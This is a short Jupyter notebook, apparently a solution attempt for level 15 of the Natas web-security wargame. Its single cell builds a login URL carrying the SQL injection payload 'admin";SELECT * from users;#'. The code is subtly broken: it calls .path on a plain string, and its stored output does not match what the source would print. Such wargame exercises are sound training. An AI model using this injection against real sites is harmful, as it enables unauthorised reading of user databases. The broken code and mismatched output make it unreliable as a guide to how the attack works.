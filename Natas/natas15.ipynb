{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "?username=ParseResult(scheme='', netloc='', path='admin\"', params='SELECT * from users;', query='', fragment='')&password=ParseResult(scheme='', netloc='', path='123', params='', query='', fragment='')&debug=0\n"
     ]
    }
   ],
   "source": [
    "from urllib.parse import urlparse\n",
    "username = 'admin\";SELECT * from users;#'\n",
    "password = \"123\"\n",
    "\n",
    "print(f\"?username={urlparse(username).path}&password={urlparse(password.path)}&debug=0\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
